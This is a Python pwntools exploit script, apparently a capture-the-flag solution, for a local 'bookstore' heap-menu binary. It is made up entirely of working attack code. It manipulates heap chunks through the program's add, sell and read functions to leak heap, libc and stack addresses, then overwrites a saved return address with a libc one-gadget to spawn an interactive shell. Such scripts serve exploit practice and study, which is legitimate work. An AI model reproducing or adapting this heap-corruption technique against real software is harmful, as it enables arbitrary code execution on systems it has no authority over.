#!/usr/bin/env python
from pwn import *
p=process('./bookstore',env={'LD_PRELOAD':'./libc_64.so'})

elf=ELF('./libc_64.so')

context(arch='amd64',os='linux',log_level='debug')

ru=lambda s:p.recvuntil(s)
sl=lambda s:p.sendline(s)
sd=lambda s:p.send(s)



def debugf(load=''):
    gdb.attach(p,load)

def menu(i):
    ru('choice:\n')
    sl(str(i))

def new(author_name,name_len,name,sline=1,is_sleep=0):
    menu(1)
    ru('name?\n')
    if sline:
        sl(author_name)
    else:
        sd(author_name)
    ru('name?\n')
    sl(str(name_len))
    ru('book?\n')
    if sline:
        sl(name)
    else:
        sd(name)
    if is_sleep:
        sleep(2)

def sell(index):
    menu(2)
    ru('sell?\n')
    sl(str(index))

def read(index):
    menu(3)
    ru('sell?\n')
    sl(str(index))    


new('\x21',0x10,'a')
new('\x21',0x10,'a')
sell(1)
sell(0)
new('\x21',0x10,'')     
new('\x21',0x10,'a')     # 1
read(0)
ru('kname:')
heap_base=u64(ru('\n').strip('\n').ljust(8,'\x00'))-0x20
print(hex(heap_base))

new('\x21',0x10,'a')  
new('\x21',0x10,'a')   # 3
new('\x21',0x10,'a')   # 4
new('\x21',0x10,'a')   # 5
new('\x21',0x20,p64(0)+'\x21')   # 6          avoid malloc consolidate

new('\x21',0,'')        # 7
new('\x21',0x20,'')        # 8

sell(0)

payload=p64(0)*2                                 
payload+=p64(0)+p64(0x21)+p64(heap_base+0x40)+p64(heap_base+0x40)         
payload+=p64(0x20)+p64(0x90)+p64(heap_base+0x20)+p64(heap_base+0x20)         
payload+=(p64(0)+p64(0x21)+p64(0)+p64(0))*3
new('\x21',0,payload)      

sell(2)
# raw_input('#')
new('\x21',0,'')          

read(1)
read(2)
ru('kname:')

libc_base=u64(ru('\n').strip('\n').ljust(8,'\x00'))-0x3c4c18
elf.address=libc_base

malloc_hook=elf.symbols['__malloc_hook']
main_arena=malloc_hook+0x10

print(hex(libc_base))
print(hex(malloc_hook))
print(hex(main_arena))



bss_target=0x602058 
sell(1)
sell(0)
sell(2)

new('\x21',0,p64(bss_target))           # 0       
new('\x21',0,p64(bss_target))           # 1
new('\x21',0,p64(bss_target))           # 2            # xuyao bao liu


libc_environ=elf.symbols['_environ']

payload='\x00'*0x18+p64(heap_base+0x30)                     # 0
payload+=p64(0x21)+'\x00'*0x18+p64(heap_base+0x10)       # 1
payload+=p64(0x21)+'\x00'*0x18+p64(heap_base+0x30)       # 2
payload+=p64(0x21)+'\x00'*0x18+p64(libc_environ)         # 3

new('a'*20,0,payload)                        # 9
read(3)
ru('Bookname:')
stack=u64(ru('\n').strip('\n').ljust(8,'\x00'))
print('stack: ',hex(stack))

# =================================================
sell(0)
sell(1)
sell(2)


ret_rip=stack-0x110
stack_target=ret_rip-0x150

new('\x21',0,p64(stack_target))           # 0       
new('\x21',0,p64(stack_target))           # 1
new('\x21',0,p64(stack_target))           # 2            # xuyao bao liu

one_off=0x45216
one_off=0x4526a
# one_off=0xf0274
# one_off=0xf1117

one=one_off+libc_base





# payload='b'*100
# new('aaaa',0,payload,is_sleep=1)  # 10
# debugf('nb 400A24')  
menu(1)
ru('name?\n')
sl('aaaa')
ru('name?\n')
sl('0')
ru('book?\n')

print('ret rip',hex(ret_rip))
print('stack_target',hex(stack_target))
print('stack_input_addr',hex(stack_target+0x10))

payload='b'*0xfc+p32(0)+p64(stack_target+0x10)+p64(0)+p32(0)+'\x20'+p64(one)
payload+='\x00'*0x38+p64(0)
p.send(payload)
p.send('\n')

p.interactive()